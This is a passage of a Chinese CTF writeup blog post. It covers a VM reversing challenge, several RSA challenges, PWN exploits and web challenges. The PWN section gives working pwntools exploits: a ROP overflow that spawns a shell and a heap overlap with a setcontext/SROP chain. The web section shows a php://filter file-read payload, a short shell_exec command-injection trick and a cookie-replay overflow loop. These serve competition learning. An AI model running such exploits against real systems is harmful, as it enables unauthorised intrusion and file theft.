class="number">0xB4</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;r9 = buf[3]&quot;</span>)</span><br><span class="line">        r9 = buf[<span class="number">3</span>]</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xC1</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;mov eax,s[<span class="subst">&#123;code[ip+<span class="number">1</span>]&#125;</span>]&quot;</span>)</span><br><span class="line">     </span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xC7</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;if eax!= &quot;</span> + <span class="built_in">hex</span>(<span class="number">0xCF1304DC</span>) + <span class="string">&quot;\n goto wrong\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># if (0xCF1304DC != eax):</span></span><br><span class="line">        <span class="comment">#     exit(0):</span></span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xC8</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;if eax!= &quot;</span> + <span class="built_in">hex</span>(<span class="number">0x283B8E84</span>) + <span class="string">&quot;\n goto wrong\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line">        s.add(<span class="number">0x283B8E84</span> == eax)</span><br><span class="line">        <span class="comment"># if (dword_804B064 != eax):</span></span><br><span class="line">        <span class="comment">#     exit(0):</span></span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xC2</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;cmp eax,<span class="subst">&#123;code[ip+<span class="number">1</span>]&#125;</span>\n goto wrong\n&quot;</span>)</span><br><span class="line">        <span class="comment">#flag += chr(r9^code[ip+1])   # 直接打印</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># if (*(ip + 1) != eax):</span></span><br><span class="line">        <span class="comment">#     exit(0):</span></span><br><span class="line">        ip += <span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>观察第一部分，可以知道是简单异或，在最后一段cmp时直接打印即可。 第二部分是各种位运算，想用z3解不出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mov eax,s[32]</span><br><span class="line">mov ebx,0x0000018</span><br><span class="line">shl eax,ebx 24</span><br><span class="line">mov r9,eax</span><br><span class="line">mov eax,s[33]</span><br><span class="line">mov ebx,0x0000010</span><br><span class="line">shl eax,ebx 16</span><br><span class="line">add r9,eax</span><br><span class="line">mov eax,s[34]</span><br><span class="line">mov ebx,0x0000008</span><br><span class="line">shl eax,ebx 8</span><br><span class="line">add r9,eax</span><br><span class="line">mov eax,s[35]</span><br><span class="line">add r9,eax</span><br><span class="line">mov eax,r9</span><br><span class="line">mov ebx,0x0000005</span><br><span class="line">shr eax,ebx</span><br><span class="line">xor eax,r9</span><br><span class="line">mov r9,eax</span><br><span class="line">mov ebx,0x0000007</span><br><span class="line">shl eax,ebx 7</span><br><span class="line">mov ebx,0x98f17723</span><br><span class="line">and eax,ebx</span><br><span class="line">xor eax,r9</span><br><span class="line">mov r9,eax</span><br><span class="line">mov ebx,0x0000018</span><br><span class="line">shl eax,ebx 24</span><br><span class="line">mov ebx,0x35e4b920</span><br><span class="line">and eax,ebx</span><br><span class="line">xor eax,r9</span><br><span class="line">mov r9,eax</span><br><span class="line">mov ebx,0x0000012</span><br><span class="line">shr eax,ebx</span><br><span class="line">xor eax,r9</span><br></pre></td></tr></table></figure>

<p>直接爆破</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span>  constx = <span class="number">0x6febf967</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">uint32_t</span> tmp = <span class="number">0x01010101</span> ;tmp &lt;<span class="number">0x80808080</span>;tmp++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">uint32_t</span> r9 = ((tmp&gt;&gt;<span class="number">5</span>)^tmp)^((((tmp&gt;&gt;<span class="number">5</span>)^tmp)&lt;&lt;<span class="number">7</span>) &amp; <span class="number">0x98f17723</span>)^(((((tmp&gt;&gt;<span class="number">5</span>)^tmp)^((((tmp&gt;&gt;<span class="number">5</span>)^tmp)&lt;&lt;<span class="number">7</span>) &amp; <span class="number">0x23</span>))&lt;&lt;<span class="number">24</span>) &amp;<span class="number">0x35e4b920</span>);</span><br><span class="line">		<span class="type">uint32_t</span> eax = (((tmp&gt;&gt;<span class="number">5</span>)^tmp)^((((tmp&gt;&gt;<span class="number">5</span>)^tmp)&lt;&lt;<span class="number">7</span>) &amp; <span class="number">0x98f17723</span>)^(((((tmp&gt;&gt;<span class="number">5</span>)^tmp)^((((tmp&gt;&gt;<span class="number">5</span>)^tmp)&lt;&lt;<span class="number">7</span>) &amp; <span class="number">0x23</span>))&lt;&lt;<span class="number">24</span>) &amp;<span class="number">0x35e4b920</span>))&gt;&gt;<span class="number">0x12</span>;</span><br><span class="line">		<span class="keyword">if</span>((r9^eax) == constx)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="built_in">printf</span>(<span class="string">&quot;%08llx %08llx\n&quot;</span>,tmp,r9^eax);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p>套脚本</p>
<p><a target="_blank" rel="noopener" href="https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/">Summary of Crypto in CTF(RSA) | 0xDktb’s Blog</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rho</span>(<span class="params">n</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(<span class="built_in">abs</span>(a - b), n)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; in &#123;&#125; circle&#x27;</span>.<span class="built_in">format</span>(j, i))</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    n = <span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line">    <span class="built_in">print</span>(rho(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="comment">#     main()</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line">e = <span class="number">58337</span></span><br><span class="line">c = <span class="number">13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">8437905502983445042677582637893534375137565614989838462475696727313788501904161403475771835934720130340799646782932619714906025013322551788559197469878239</span></span><br><span class="line">q = <span class="number">9983140483800634632426126985832058062766650402234684899412786169759602188949733747138853010482968306554808689182393249326088351886439191015684338347893201</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Bigrsa"><a href="#Bigrsa" class="headerlink" title="Bigrsa"></a>Bigrsa</h2><p>GCD发现公因数，直接解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">1021003918927616739563677955727105734669195099</span>1057423589319031237857569595284598319093522326723650646963251941930167018746859556383067696079622198265424441q = n1//pq2 = n2//pphi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)phi2 =(p-<span class="number">1</span>)*(q2-<span class="number">1</span>)d1 = inverse(e,phi)d2 = inverse(e,phi2)m1 = <span class="built_in">pow</span>(c,d2,n2)m2 = <span class="built_in">pow</span>(m1,d1,n1)<span class="keyword">from</span> libnum <span class="keyword">import</span>  *<span class="built_in">print</span>(n2s(m2))	</span><br></pre></td></tr></table></figure>

<h2 id="ring"><a href="#ring" class="headerlink" title="ring"></a>ring</h2><p>求a^4+b^4+c^4+d^4&#x3D;e^2的100个解，直接令a&#x3D;b&#x3D;c&#x3D;d，e&#x3D;2<em>a</em>a</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlibimport itertoolsfrom pwn <span class="keyword">import</span> *<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *sh = remote(<span class="string">&quot;192.168.39.213&quot;</span>,<span class="number">2378</span>)s = sh.recvline().strip().decode()k1 = s[<span class="number">36</span>:<span class="number">40</span>]k2=s[-<span class="number">5</span>:]<span class="built_in">print</span>(k1)<span class="built_in">print</span>(k2)chars = <span class="string">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot;</span><span class="keyword">for</span> cs <span class="keyword">in</span> itertools.product(chars,repeat=<span class="number">5</span>):    st0 = <span class="string">&quot;&quot;</span>.join(cs)    st = st0 + k1    <span class="keyword">if</span>(hashlib.md5(st.encode()).hexdigest()[<span class="number">0</span>:<span class="number">5</span>]==k2):        <span class="built_in">print</span>(st0)        breaksh.sendline(st0)ss = sh.recvline()ss = sh.recvline()<span class="built_in">print</span>(ss)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):    ss=sh.recvuntil(<span class="string">&quot;:&quot;</span>)    sh.sendline(<span class="built_in">str</span>(i))    ss=sh.recvuntil(<span class="string">&quot;:&quot;</span>)    sh.sendline(<span class="built_in">str</span>(i))    ss=sh.recvuntil(<span class="string">&quot;:&quot;</span>)    sh.sendline(<span class="built_in">str</span>(i))    ss=sh.recvuntil(<span class="string">&quot;:&quot;</span>)    sh.sendline(<span class="built_in">str</span>(i))    ss=sh.recvuntil(<span class="string">&quot;:&quot;</span>)    sh.sendline(<span class="built_in">str</span>(i*i*<span class="number">2</span>))    <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span>,i,<span class="string">&quot; done&quot;</span>)sh.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;192.168.39.213&quot;</span>,<span class="number">11000</span>)</span><br><span class="line">sh = <span class="number">0x0804c029</span></span><br><span class="line">system = <span class="number">0x80491EF</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span> + p32(<span class="number">0</span>) + p32(system) + p32(sh) *<span class="number">0x4</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="name"><a href="#name" class="headerlink" title="name"></a>name</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./name&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;5.exit\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,con</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;name:\n&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;leak = &quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">libcbase = leak -<span class="number">0x7ffff7b85f18</span> + <span class="number">0x7ffff77c1000</span></span><br><span class="line">log.info(<span class="string">&quot;libcbase = &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">heap_leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;heap_leak = &quot;</span> + <span class="built_in">hex</span>(heap_leak))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#4</span></span><br><span class="line">addr = heap_leak + <span class="number">0x90</span></span><br><span class="line">payload = p64(addr) + p64(<span class="number">0xf1</span>) + p64(addr -<span class="number">0x18</span>) + p64(addr-<span class="number">0x10</span>) + <span class="string">&quot;x&quot;</span>*<span class="number">0xd0</span> + p64(<span class="number">0xf0</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xc0</span>) <span class="comment">#3 overlap with 2</span></span><br><span class="line">add(<span class="number">0xd0</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">setcontext = libcbase + libc.symbols[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">53</span></span><br><span class="line">syscall = libcbase + <span class="number">0x00000000000026bf</span></span><br><span class="line">ret = <span class="number">0x0000000000000937</span> + libcbase</span><br><span class="line">pop_rax = <span class="number">0x000000000003a738</span> + libcbase</span><br><span class="line">prdi = <span class="number">0x0000000000021112</span> + libcbase</span><br><span class="line">prsi = <span class="number">0x00000000000202f8</span> + libcbase</span><br><span class="line">prdx = <span class="number">0x0000000000001b92</span> + libcbase</span><br><span class="line">read = libc.symbols[<span class="string">&quot;read&quot;</span>] + libcbase</span><br><span class="line">write = libc.symbols[<span class="string">&quot;write&quot;</span>] + libcbase</span><br><span class="line">openx = libc.symbols[<span class="string">&quot;open&quot;</span>] + libcbase</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_leak + <span class="number">0x90</span></span><br><span class="line">frame.rip = ret</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = heap_leak -<span class="number">0x120</span> + <span class="built_in">len</span>(<span class="built_in">str</span>(frame))</span><br><span class="line"></span><br><span class="line">rop = p64(prdi) + p64(heap_leak -<span class="number">0x120</span> + <span class="built_in">len</span>(<span class="built_in">str</span>(frame))) + p64(prsi) + p64(<span class="number">0</span>) +  p64(openx)</span><br><span class="line">rop += p64(prdi) + p64(<span class="number">3</span>) + p64(prsi)+p64(heap_leak+<span class="number">0x200</span>) + p64(prdx)+p64(<span class="number">0x40</span>) + p64(read)</span><br><span class="line">rop += p64(prdi) + p64(<span class="number">1</span>) + p64(write)</span><br><span class="line">rop += ((<span class="number">0xd0</span>-<span class="built_in">len</span>(rop))&gt;&gt;<span class="number">3</span>)*p64(ret)</span><br><span class="line">edit(<span class="number">2</span>,rop+p64(<span class="number">0x0</span>)+p64(<span class="number">0x21</span>)+p64(setcontext)+p64(heap_leak-<span class="number">0x120</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">str</span>(frame)+<span class="string">&quot;flag\x00&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Checkin-Go"><a href="#Checkin-Go" class="headerlink" title="Checkin_Go"></a>Checkin_Go</h2><p>由于登录态写在cookie中，在本地起一个环境后以admin登录，获取cookie后替换到题目上，就能以admin的身份登录，然后由于整型溢出，每次addPrice的数值为34359738368时，flag price的值会-1，重复发包就能将flag price减到5000以下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsurl = <span class="string">&#x27;http://192.168.39.213:8088/play/add&#x27;</span>data = &#123;<span class="string">&#x27;addMoney&#x27;</span>:<span class="string">&quot;34359738368&quot;</span>&#125;cookies = &#123;<span class="string">&#x27;o&#x27;</span>:<span class="string">&quot;MTYzMTMzMjYyOHxEdi1CQkFFQ180SUFBUkFCRUFBQV9fbl9nZ0FHQm5OMGNtbHVad3dQQUExamFHVmphMDV2ZDAxdmJtVjVCbk4wY21sdVp3d1lBQlpGTWpWM1gxWlBRMU0yVjJkZmN6bEhSblE1VEZSQkJuTjBjbWx1Wnd3TkFBdHdiR0Y1WlhKTmIyNWxlUU5wYm5RRUJBRC1KeEFHYzNSeWFXNW5EQklBRUdOb1pXTnJVR3hoZVdWeVRXOXVaWGtHYzNSeWFXNW5EQmdBRms5dFNGRTRjRUl5WkdsM1dFdDRNMUpOYUVwS1ZYY0djM1J5YVc1bkRBVUFBMmh6YUFaemRISnBibWNNQ0FBR09HTTBORFprQm5OMGNtbHVad3dIQUFWMWJtRnRaUVp6ZEhKcGJtY01Cd0FGWVdSdGFXNEdjM1J5YVc1bkRBb0FDRzV2ZDAxdmJtVjVCblZwYm5Rek1nWUZBUDBERFQwPXxsgDc8MHETjdyAH8WDaDE08tsUxDIo7B9UheSUXK-t4w==&quot;</span>&#125;<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">200000</span>):    r = requests.post(url,data = data, cookies=cookies)    cookies = requests.utils.dict_from_cookiejar(r.cookies)    <span class="comment">#print(cookies)</span></span><br></pre></td></tr></table></figure>



<h2 id="Only-4"><a href="#Only-4" class="headerlink" title="Only 4"></a>Only 4</h2><p>首先任意文件读取</p>
<p><code>?gwht=php://filter/convert.base64-encode/resource=serialize.php</code></p>
<p>读到源码后是一个反序列化，由于<code>Flag</code>被过滤，本地测试发现类名大小写不敏感，因此将<code>GetFlag</code>改成<code>GetFlaG</code>就能正常反序列化读取<code>secret.php</code>的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;SXF&#x27;</span>])&lt;<span class="number">5</span>)&#123;    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;SXF&#x27;</span>]);&#125;</span><br></pre></td></tr></table></figure>

<p>执行系统命令，但是字符长度限制在5个以下</p>
<p>payload1  	<code>&gt;cat</code>  创建一个名为<code>cat</code>的文件</p>
<p>payload2    <code>* /*</code>  第一个星号会把目录下第一个文件的文件名当成命令执行，因此该payload相当于<code>cat /*</code> 读取根目录下所有文件</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/10/WriteUp/%F0%9F%90%A6%F0%9F%8D%8A%F0%9F%8F%86%20Writeup/" title="🐦🍊🏆 Writeup"><img class="cover" src="https://s2.loli.net/2024/02/20/h3iOcSdRqel45vD.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">🐦🍊🏆 Writeup</div></div></a></div><div class="next-post pull-right"><a href="/2021/08/29/Reverse/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0-PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="加密与解密笔记-PE文件格式"><img class="cover" src="https://i.loli.net/2021/08/29/ki8y5sOeEBKD49A.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">加密与解密笔记-PE文件格式</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/05/04/Zav4zFVukLJMBKI.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">devoke</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a 